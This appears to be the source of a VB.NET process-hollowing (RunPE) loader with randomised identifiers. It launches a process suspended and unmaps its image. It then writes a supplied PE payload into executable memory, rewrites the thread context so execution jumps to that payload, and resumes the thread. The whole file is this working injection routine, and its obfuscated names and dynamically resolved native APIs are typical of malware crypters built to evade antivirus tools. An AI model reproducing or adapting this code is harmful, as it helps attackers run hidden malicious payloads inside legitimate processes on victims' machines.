﻿Imports System.Runtime.InteropServices
Imports System.Text


Public Class kUkzHeoAaXc
    Public Declare Function zeETJw Lib "kernel32" Alias "LoadLibraryA" (ByVal NqSF As String) As IntPtr
    Public Declare Function vSybyz Lib "kernel32" Alias "GetProcAddress" (ByVal qBh As IntPtr, ByVal NqSF As String) As IntPtr
    Function dZBYPqvcyJvZcaq(Of T)(ByVal NqSF As String, ByVal tTlH As String) As T
        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(vSybyz(zeETJw(NqSF), tTlH), GetType(T)), Object), T)
    End Function
    Delegate Function jGNIcM(ByVal pTvT As IntPtr, ByVal HDNbGNYlS As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function hmregO(ByVal lUFf As IntPtr, ByVal NUZg As IntPtr) As UInteger
    Delegate Function WTpZZZ(ByVal lUFf As IntPtr, ByVal NUZg As IntPtr, ByRef bufr As IntPtr, ByVal bufrPUHWqFTvQ As Integer, ByRef Frmd As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function jMMYWL(ByVal pTvTead As IntPtr, ByVal pfna As IntPtr) As UInteger
    Delegate Function TYbFze(ByVal pTvT As IntPtr, ByVal HDNbGNYlS As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Delegate Function iIhTKP(ByVal lUFf As IntPtr, ByVal VIGc As IntPtr, ByVal PUHWqFTvQ As IntPtr, ByVal EVtE As Integer, ByVal RJQo As Integer) As IntPtr
    Delegate Function nvHELK(ByVal lUFfess As IntPtr, ByVal GQcelOeyW As IntPtr, ByVal ghHy As Byte(), ByVal nPUHWqFTvQ As UInteger, ByVal Xhwdjvqi As Integer) As Boolean
    Public Declare Auto Function DYxflu Lib "kernel32" Alias "CreateProcessW" (ByVal MKa As String, ByVal vXNc As StringBuilder, ByVal fTCglvCwI As IntPtr, ByVal IKkM As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal XibW As Boolean, ByVal DLuY As Integer, ByVal mYh As IntPtr, ByVal zMEj As String, ByVal Pjvu As Byte(), ByVal vMOv As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Function kGAMapt(ByVal mUPPgMV As Long, Optional ByVal gtvVPsL As Long = &H4) As Integer
        Dim QoDuPkD As IntPtr
        Dim xQOkHdM As Integer
        Dim Lkeaj As WTpZZZ = dZBYPqvcyJvZcaq(Of WTpZZZ)("ntdll", "NtReadVirtualMemory")
        Call Lkeaj(Process.GetCurrentProcess.Handle, mUPPgMV, QoDuPkD, gtvVPsL, xQOkHdM)
        Return QoDuPkD
    End Function
    Public Function pfCLkCaksx(ByVal sXgYRIMZ As Byte(), ByVal mgGWXOGo As String) As Boolean
        Try
            Dim TTYEzicS As GCHandle = GCHandle.Alloc(sXgYRIMZ, GCHandleType.Pinned) : Dim hModuleBase As Integer = TTYEzicS.AddrOfPinnedObject : TTYEzicS.Free()
            Dim fTCglvCwI As IntPtr = IntPtr.Zero
            Dim SeFdAUYPd As IntPtr() = New IntPtr(3) {}
            Dim jcasSdbrW As Byte() = New Byte(67) {}
            Dim PzlSRWqM As Integer = BitConverter.ToInt32(sXgYRIMZ, 60)
            Dim EkIGqMsC As Integer
            Dim HDNbGNYlS As UInteger() = New UInteger(178) {}
            HDNbGNYlS(0) = &H10002
            DYxflu(Nothing, New StringBuilder(mgGWXOGo), fTCglvCwI, fTCglvCwI, False, 4, fTCglvCwI, Nothing, jcasSdbrW, SeFdAUYPd)
            Dim kkhuNLojW As Integer = (hModuleBase + kGAMapt(hModuleBase + &H3C))
            EkIGqMsC = kGAMapt(kkhuNLojW + &H34)
            Dim eUpLT As hmregO = dZBYPqvcyJvZcaq(Of hmregO)("ntdll", "NtUnmapViewOfSection")
            eUpLT(SeFdAUYPd(0), EkIGqMsC)
            Dim Dkpmc As iIhTKP = dZBYPqvcyJvZcaq(Of iIhTKP)("kernel32", "VirtualAllocEx")
            Dim GQcelOeyW As IntPtr = Dkpmc(SeFdAUYPd(0), EkIGqMsC, kGAMapt(kkhuNLojW + &H50), &H3000, &H40)
            Dim DCOcfrCEf As New IntPtr(BitConverter.ToInt32(sXgYRIMZ, PzlSRWqM + &H34))
            Dim PUHWqFTvQ As New IntPtr(BitConverter.ToInt32(sXgYRIMZ, PzlSRWqM + 80))
            Dim YOZyPYMwC As Integer
            Dim Xhwdjvqi As Integer
            Dim api8 As nvHELK = dZBYPqvcyJvZcaq(Of nvHELK)("ntdll", "NtWriteVirtualMemory")
            api8(SeFdAUYPd(0), GQcelOeyW, sXgYRIMZ, CUInt(CInt(kGAMapt(kkhuNLojW + &H54))), YOZyPYMwC)
            For i = 0 To kGAMapt(kkhuNLojW + &H6, 2) - 1
                Dim NNmMhktkr As Integer() = New Integer(9) {}
                Buffer.BlockCopy(sXgYRIMZ, (PzlSRWqM + &HF8) + (i * 40), NNmMhktkr, 0, 40)
                Dim hdLjDpOZx As Byte() = New Byte((NNmMhktkr(4) - 1)) {}
                Buffer.BlockCopy(sXgYRIMZ, NNmMhktkr(5), hdLjDpOZx, 0, hdLjDpOZx.Length)
                PUHWqFTvQ = New IntPtr(GQcelOeyW.ToInt32() + NNmMhktkr(3))
                DCOcfrCEf = New IntPtr(hdLjDpOZx.Length)
                api8(SeFdAUYPd(0), PUHWqFTvQ, hdLjDpOZx, CUInt(DCOcfrCEf), Xhwdjvqi)
            Next i
            Dim KlBVX As jGNIcM = dZBYPqvcyJvZcaq(Of jGNIcM)("ntdll", "NtGetContextThread")
            KlBVX(SeFdAUYPd(1), HDNbGNYlS)
            api8(SeFdAUYPd(0), HDNbGNYlS(41) + &H8, BitConverter.GetBytes(GQcelOeyW.ToInt32()), CUInt(&H4), Xhwdjvqi)
            HDNbGNYlS(&H2C) = EkIGqMsC + kGAMapt(kkhuNLojW + &H28)
            Dim urRmG As TYbFze = dZBYPqvcyJvZcaq(Of TYbFze)("ntdll", "NtSetContextThread")
            urRmG(SeFdAUYPd(1), HDNbGNYlS)
            Dim iaYrv As jMMYWL = dZBYPqvcyJvZcaq(Of jMMYWL)("ntdll", "NtResumeThread")
            iaYrv(SeFdAUYPd(1), 0)
        Catch ex As Exception
            Return False
        End Try
        Return True
    End Function
End Class